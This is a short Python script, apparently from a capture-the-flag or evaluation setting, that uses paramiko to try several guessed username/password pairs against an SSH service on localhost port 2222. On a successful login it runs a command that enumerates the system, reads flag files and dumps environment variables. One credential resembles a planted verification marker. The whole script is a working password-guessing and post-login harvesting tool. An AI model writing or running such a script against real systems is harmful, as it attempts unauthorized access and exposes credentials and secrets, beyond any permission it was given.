import socket, paramiko

HOST, PORT = "127.0.0.1", 2222
CREDS = [
    ("audit", "probe"),
    ("audit", "audit"),
    ("audit", ""),
    ("probe", "probe"),
    ("verify-3f3dfa3a1149dc007963bfeba65759d8", "verification"),
]

def attempt(user, pw):
    t = paramiko.Transport((HOST, PORT))
    try:
        t.start_client(timeout=4)
        try:
            b = t.get_banner()
            txt = (b[0] or b[1] or "").strip()
            if txt:
                print(f"[*] pre-auth banner: {txt!r}")
        except Exception:
            pass
        try:
            t.auth_password(user, pw, fallback=False)
        except paramiko.SSHException as e:
            print(f"[-] {user!r} / {pw!r} -> {type(e).__name__}: {e}")
            return False
        print(f"[+] AUTH SUCCESS: {user!r} / {pw!r}")
        try:
            ch = t.open_session(timeout=3)
            ch.exec_command("id; pwd; ls -la . / /home 2>/dev/null; cat /flag* flag* /home/*/flag* /root/flag* 2>/dev/null; env")
            ch.settimeout(2)
            buf = b""
            while True:
                try:
                    d = ch.recv(4096)
                except socket.timeout:
                    break
                if not d:
                    break
                buf += d
                if len(buf) > 100000:
                    break
            print("--- session output ---")
            print(buf.decode("utf-8", "replace"))
        except Exception as e:
            print(f"[!] exec/session unavailable: {type(e).__name__}: {e}")
        return True
    except Exception as e:
        print(f"[!] conn error ({user!r}): {type(e).__name__}: {e}")
        return False
    finally:
        try:
            t.close()
        except Exception:
            pass

got = False
for u, p in CREDS:
    if attempt(u, p):
        got = True
        break
print("RESULT:", "ACCESS-OBTAINED" if got else "NO-ACCESS: all synthetic pairs rejected")
PYEOF

